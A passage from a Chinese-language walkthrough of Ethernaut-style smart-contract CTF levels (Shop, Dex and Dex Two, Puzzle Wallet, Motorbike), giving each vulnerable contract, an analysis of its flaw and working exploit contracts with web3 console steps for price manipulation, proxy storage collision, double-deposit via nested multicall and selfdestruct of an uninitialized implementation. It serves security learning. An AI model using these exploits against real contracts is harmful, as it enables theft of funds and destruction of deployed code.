            }
        }
    }
    ```

目的是使 price 小于 100。和 Elevator 类似，只要使两次调用 price 得到的值不一样就可以了

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    /* code of Shop */

    contract Exploit {
        Shop challenge;
        constructor(address addr) public {
            challenge = Shop(addr);
        }
        function price() external view returns (uint) {
            if (challenge.isSold()) {
                return 90;
            }
            return 100;
        }
        function exp() public {
            challenge.buy();
        }
    }
    ```

---

## Dex & Dex Two

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import '@openzeppelin/contracts/math/SafeMath.sol';

    contract Dex {
        using SafeMath for uint;
        address public token1;
        address public token2;
        constructor(address _token1, address _token2) public {
            token1 = _token1;
            token2 = _token2;
        }

        function swap(address from, address to, uint amount) public {
            require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
            uint swap_amount = get_swap_price(from, to, amount);
            IERC20(from).transferFrom(msg.sender, address(this), amount);
            IERC20(to).approve(address(this), swap_amount);
            IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
        }

        function add_liquidity(address token_address, uint amount) public{
            IERC20(token_address).transferFrom(msg.sender, address(this), amount);
        }

        function get_swap_price(address from, address to, uint amount) public view returns(uint){
            return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
        }

        function approve(address spender, uint amount) public {
            SwappableToken(token1).approve(spender, amount);
            SwappableToken(token2).approve(spender, amount);
        }

        function balanceOf(address token, address account) public view returns (uint){
            return IERC20(token).balanceOf(account);
        }
    }

    contract SwappableToken is ERC20 {
        constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
            _mint(msg.sender, initialSupply);
        }
    }
    ```

题意就是玩家账户上的 token1 和 token2 都各有 10 个 token，而题目账户上有 100 个，目的是把题目账户上的某个 token 清零

题目的 Dex 合约主要提供了 swap 这个函数用来在两个 token 间交换金额。但是转出的时候先调用了 get_swap_price 来计算金额，而且在其中调用的是两方格子的 balanceOf 函数。因此可以构造一个新的 IERC20 的 token，让它的 balanceOf 始终返回 1，作为分母，这样转出的时候就会转出题目 token 中的所有余额了

Dex Two 和 Dex 差别就在于 DexTwo 需要将两个 token 都置为 0，用 exp 函数分别打下 token1 和 token2 就行

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    /* code of Dex */

    contract ExploitToken {
        function balanceOf(address account) public view returns (uint256) {
            return 1;
        }
        function transferFrom(address, address, uint256) public returns (bool) {
            return true;
        }
    }

    contract Exploit {
        address token = address(new ExploitToken());
        Dex challenge;
        constructor(address addr) public {
            challenge = Dex(addr);
        }
        function exp(address token1) public {
            challenge.swap(token, token1, 1);
        }
    }
    ```

---

## Puzzle Wallet

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    pragma experimental ABIEncoderV2;

    import "@openzeppelin/contracts/math/SafeMath.sol";
    import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";

    contract PuzzleProxy is UpgradeableProxy {
        address public pendingAdmin;
        address public admin;

        constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
            admin = _admin;
        }

        modifier onlyAdmin {
            require(msg.sender == admin, "Caller is not the admin");
            _;
        }

        function proposeNewAdmin(address _newAdmin) external {
            pendingAdmin = _newAdmin;
        }

        function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
            require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
            admin = pendingAdmin;
        }

        function upgradeTo(address _newImplementation) external onlyAdmin {
            _upgradeTo(_newImplementation);
        }
    }

    contract PuzzleWallet {
        using SafeMath for uint256;
        address public owner;
        uint256 public maxBalance;
        mapping(address => bool) public whitelisted;
        mapping(address => uint256) public balances;

        function init(uint256 _maxBalance) public {
            require(maxBalance == 0, "Already initialized");
            maxBalance = _maxBalance;
            owner = msg.sender;
        }

        modifier onlyWhitelisted {
            require(whitelisted[msg.sender], "Not whitelisted");
            _;
        }

        function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
            require(address(this).balance == 0, "Contract balance is not 0");
            maxBalance = _maxBalance;
        }

        function addToWhitelist(address addr) external {
            require(msg.sender == owner, "Not the owner");
            whitelisted[addr] = true;
        }

        function deposit() external payable onlyWhitelisted {
            require(address(this).balance <= maxBalance, "Max balance reached");
            balances[msg.sender] = balances[msg.sender].add(msg.value);
        }

        function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
            require(balances[msg.sender] >= value, "Insufficient balance");
            balances[msg.sender] = balances[msg.sender].sub(value);
            (bool success, ) = to.call{ value: value }(data);
            require(success, "Execution failed");
        }

        function multicall(bytes[] calldata data) external payable onlyWhitelisted {
            bool depositCalled = false;
            for (uint256 i = 0; i < data.length; i++) {
                bytes memory _data = data[i];
                bytes4 selector;
                assembly {
                    selector := mload(add(_data, 32))
                }
                if (selector == this.deposit.selector) {
                    require(!depositCalled, "Deposit can only be called once");
                    // Protect against reusing msg.value
                    depositCalled = true;
                }
                (bool success, ) = address(this).delegatecall(data[i]);
                require(success, "Error while delegating call");
            }
        }
    }
    ```

题目比较复杂，最终目的是使 PuzzleProxy 的 admin 为 player

因为 PuzzleProxy 和 PuzzleWallet 部署在同一个地址上，它们的 storage 会共用，所以就导致了 PuzzleProxy 的 pendingAdmin 对应了 PuzzleWallet 的 owner，PuzzleWallet 的 maxBalance 对应了 PuzzleProxy 的 admin

从后往前推：

- 要使 admin 变为 player，则可以设置 maxBalance 为 player
- 而 setMaxBalance 函数需要先使当前合约账户的余额变为 0
- 合约账户余额减少的方式在 execute 中的 call，使余额减少 value
- 但这样要使 balances[player] >= value
- 而通过 deposit 增加 balances[player] 的话，合约账户余额也会同步增加
- 所以要使用 multicall 函数来使 balances[player] 增加量为合约账户余额增加量的二倍
- 但是 multicall 中检测了 selector 使 deposit 只能调用一次
- 这可以通过 multicall 中执行两个 multicall，每个 multicall 调用一次 deposit

这样分析之后问题就解决了，首先调用 proposeNewAdmin 来使 pendingAdmin（owner）变为 player，这个函数不能直接调用，但是可以通过发送合约的方式调用
```js
> await web3.eth.getStorageAt(instance, 0)  // owner
'0x000000000000000000000000<level address>'
> web3.utils.sha3("proposeNewAdmin(address)").slice(0, 10)  // selector
'0xa6376746'
> data = web3.utils.sha3("proposeNewAdmin(address)").slice(0, 10) + player.slice(2).padStart(64, "0")
'0xa6376746000000000000000000000000<player address>'
> web3.eth.sendTransaction({from: player, to: instance, data: data})
> await web3.eth.getStorageAt(instance, 0)
'0x000000000000000000000000<player address>'
```

然后拿到 owner 后需要将自己加入白名单，并且先查询一下合约账户余额
```js
> await contract.addToWhitelist(player)
> await getBalance(instance)
'0.001'
```

所以需要构造一个 calldata，它会通过 multicall 调用 deposit，然后把两个这个 calldata 传入 multicall，同时附带 value 0.001 ether，这样 balances[player] 就会增加 0.002 ether，然后就可以通过 execute 直接提取出这 0.002 ether

提取后合约账户的 balance 变为 0，就可以设置 maxBalance 了
```js
> web3.utils.sha3("deposit()").slice(0, 10) // deposit selector
'0xd0e30db0'
> data = (await contract.methods["multicall(bytes[])"].request(["0xd0e30db0"])).data // 构造通过 multicall 调用 deposit 的 calldata
'0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000'
> await contract.multicall([data, data], {value: toWei("0.001")})
> await getBalance(instance)
'0.002'
> contract.execute(player, toWei("0.002"), 0
> await getBalance(instance)
'0'
> await web3.eth.getStorageAt(instance, 1)
'0x000000000000000000000000<level address>'
> contract.setMaxBalance(player)
> await web3.eth.getStorageAt(instance, 1)
'0x000000000000000000000000<player address>'
```

---

## Motorbike

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT

    pragma solidity <0.7.0;

    import "@openzeppelin/contracts/utils/Address.sol";
    import "@openzeppelin/contracts/proxy/Initializable.sol";

    contract Motorbike {
        // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
        bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        
        struct AddressSlot {
            address value;
        }
        
        // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
        constructor(address _logic) public {
            require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
            _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
            (bool success,) = _logic.delegatecall(
                abi.encodeWithSignature("initialize()")
            );
            require(success, "Call failed");
        }

        // Delegates the current call to `implementation`.
        function _delegate(address implementation) internal virtual {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                calldatacopy(0, 0, calldatasize())
                let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
                returndatacopy(0, 0, returndatasize())
                switch result
                case 0 { revert(0, returndatasize()) }
                default { return(0, returndatasize()) }
            }
        }

        // Fallback function that delegates calls to the address returned by `_implementation()`. 
        // Will run if no other function in the contract matches the call data
        fallback () external payable virtual {
            _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
        }
        
        // Returns an `AddressSlot` with member `value` located at `slot`.
        function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
            assembly {
                r_slot := slot
            }
        }
    }

    contract Engine is Initializable {
        // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
        bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

        address public upgrader;
        uint256 public horsePower;

        struct AddressSlot {
            address value;
        }

        function initialize() external initializer {
            horsePower = 1000;
            upgrader = msg.sender;
        }

        // Upgrade the implementation of the proxy to `newImplementation`
        // subsequently execute the function call
        function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
            _authorizeUpgrade();
            _upgradeToAndCall(newImplementation, data);
        }

        // Restrict to upgrader role
        function _authorizeUpgrade() internal view {
            require(msg.sender == upgrader, "Can't upgrade");
        }

        // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
        function _upgradeToAndCall(
            address newImplementation,
            bytes memory data
        ) internal {
            // Initial upgrade and setup call
            _setImplementation(newImplementation);
            if (data.length > 0) {
                (bool success,) = newImplementation.delegatecall(data);
                require(success, "Call failed");
            }
        }
        
        // Stores a new address in the EIP1967 implementation slot.
        function _setImplementation(address newImplementation) private {
            require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
            
            AddressSlot storage r;
            assembly {
                r_slot := _IMPLEMENTATION_SLOT
            }
            r.value = newImplementation;
        }
    }
    ```

同样有些复杂，最终目的是要销毁掉 Engine

因为整个合约中都没有 selfdestruct，所以要载入自己的合约，可以通过 upgradeToAndCall 函数来载入合约并调用，这需要通过 _authorizeUpgrade 函数的检查，也就是检查 sender 是否是 upgrader，而改变 upgrader 可以通过 initialize 函数来完成

所以攻击流程就是先通过 getStorageAt 来得到部署的 Engine 的地址，然后调用 initialize，upgradeToAndCall 一个部署的新合约，让它触发 selfdestruct 就好了

新合约：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Exploit {
    function exp() public {
        selfdestruct(payable(0));
    }
}
```

攻击流程：
```js
> await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
'0x000000000000000000000000<engine address>'
> engine = "0x<engine address>"
> data = web3.utils.sha3("initialize()").slice(0, 10)
'0x8129fc1c'
> web3.eth.sendTransaction({from: player, to: engine, data: data})
> await web3.eth.call({from: player, to: engine, data: web3.utils.sha3("upgrader()").slice(0, 10)}) // 验证 upgrader
'0x000000000000000000000000<player address>'
> exp = "<Exploit contract address>"
> expdata = web3.utils.sha3("exp()").slice(0, 10)
'0xab60ffda'
> signature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes memory',
            name: 'data'
        }
    ]
}
{name: 'upgradeToAndCall', type: 'function', inputs: Array(2)}
> data = web3.eth.abi.encodeFunctionCall(upgradeSignature, [exp, expdata])
'0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000'
> web3.eth.sendTransaction({from: player, to: engine, data: data})
```